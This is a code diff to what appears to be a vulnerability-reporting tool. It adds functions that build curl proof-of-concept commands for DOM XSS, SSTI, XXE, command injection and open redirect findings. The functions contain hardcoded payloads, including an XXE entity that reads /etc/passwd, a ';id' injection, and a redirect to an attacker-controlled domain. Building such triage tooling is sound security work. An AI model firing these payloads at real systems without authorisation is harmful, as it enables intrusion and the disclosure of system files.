@@ -75,16 +75,20 @@ def _curl(
     value: Optional[str] = None,
     headers: Optional[List[str]] = None,
     json_body: Optional[str] = None,
+    content_type: Optional[str] = None,
 ) -> str:
     """Build one shell-safe curl command as a single quoted line.
 
     ``-i`` shows response headers/status (the evidence a triager compares against);
     ``-sS`` is quiet-but-shows-errors; ``-k`` tolerates the lab certs common on targets.
+    When ``content_type`` is provided with ``json_body``, it overrides the default
+    ``application/json`` Content-Type header (e.g. for XXE payloads).
     """
     method = (method or "GET").upper()
     args: List[str] = ["curl", "-sSk", "-i"]
     if json_body is not None:
-        args += ["-X", method, "-H", "Content-Type: application/json", "--data", json_body]
+        ct = content_type or "application/json"
+        args += ["-X", method, "-H", f"Content-Type: {ct}", "--data", json_body]
         args.append(url)
     elif param is not None:
         if method == "GET":
@@ -253,6 +257,108 @@ def _poc_csrf(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
     )
 
 
+def _poc_dom_xss(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
+    url = _endpoint(ev)
+    if not url:
+        return None
+    param = ev.get("injection_point") or ev.get("parameter") or "q"
+    payload = ev.get("payload") or "<img src=x onerror=alert(document.domain)>"
+    cmd = _curl("GET", url, param=param, value=payload)
+    return PoCArtifact(
+        vuln_type="dom_xss",
+        kind="curl",
+        commands=[cmd],
+        description=f"Visit `{url}` with `{param}` set to a JavaScript probe.",
+        notes=[
+            "The page contains client-side JavaScript that reads unsanitized data "
+            "from the URL and writes it to a DOM sink. The probe executes in the browser.",
+        ],
+        reproducible=True,
+    )
+
+
+def _poc_ssti(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
+    url = _endpoint(ev)
+    param = ev.get("parameter") or ev.get("injection")
+    if not url or not param:
+        return None
+    payload = ev.get("payload") or "{{7*7}}"
+    method = ev.get("method") or "GET"
+    cmd = _curl(method, url, param=param, value=payload)
+    return PoCArtifact(
+        vuln_type="ssti",
+        kind="curl",
+        commands=[cmd],
+        description=f"Inject the template expression `{payload}` into `{param}` at `{url}`.",
+        notes=["Observe the server evaluates the expression in its response."],
+        reproducible=True,
+    )
+
+
+def _poc_xxe(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
+    url = _endpoint(ev)
+    if not url:
+        return None
+    body = (
+        '<?xml version="1.0"?>'
+        "<!DOCTYPE foo ["
+        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
+        "]>"
+        f"<root>&xxe;</root>"
+    )
+    method = ev.get("method") or "POST"
+    cmd = _curl(method, url, json_body=body, content_type="application/xml")
+    return PoCArtifact(
+        vuln_type="xxe",
+        kind="curl",
+        commands=[cmd],
+        description=f"Send an XXE payload to `{url}` with an external entity reading `/etc/passwd`.",
+        notes=[
+            "The entity content should appear in the response if the parser "
+            "resolves external entities. Adjust the entity reference as needed.",
+        ],
+        reproducible=True,
+    )
+
+
+def _poc_command_injection(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
+    url = _endpoint(ev)
+    param = ev.get("parameter") or ev.get("injection")
+    if not url or not param:
+        return None
+    payload = ev.get("payload") or ";id"
+    method = ev.get("method") or "GET"
+    cmd = _curl(method, url, param=param, value=payload)
+    return PoCArtifact(
+        vuln_type="command_injection",
+        kind="curl",
+        commands=[cmd],
+        description=f"Inject the command `{payload}` into `{param}` at `{url}`.",
+        notes=["Observe the command output in the response."],
+        reproducible=True,
+    )
+
+
+def _poc_open_redirect(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
+    url = _endpoint(ev)
+    if not url:
+        return None
+    param = ev.get("parameter") or "redirect"
+    payload = "https://attacker-controlled.com/"
+    cmd = _curl("GET", url, param=param, value=payload)
+    return PoCArtifact(
+        vuln_type="open_redirect",
+        kind="curl",
+        commands=[cmd],
+        description=f"Send a GET to `{url}` with `{param}` set to an external URL.",
+        notes=[
+            "Observe the server redirects to the attacker-controlled domain "
+            "without validation — the response should be a 3xx to the external URL.",
+        ],
+        reproducible=True,
+    )
+
+
 def _poc_subdomain_takeover(vuln: Vulnerability, ev: Dict[str, Any]) -> Optional[PoCArtifact]:
     host = ev.get("host")
     if not host:
@@ -276,7 +382,12 @@ _POC_BUILDERS: Dict[str, Callable[[Vulnerability, Dict[str, Any]], Optional[PoCA
     "xss": _poc_xss,
     "stored_xss": _poc_xss,
     "reflected_xss": _poc_xss,
+    "dom_xss": _poc_dom_xss,
     "ssrf": _poc_ssrf,
+    "ssti": _poc_ssti,
+    "xxe": _poc_xxe,
+    "command_injection": _poc_command_injection,
+    "open_redirect": _poc_open_redirect,
     "jwt_abuse": _poc_access_control,
     "broken_access_control": _poc_access_control,
     "idor": _poc_access_control,
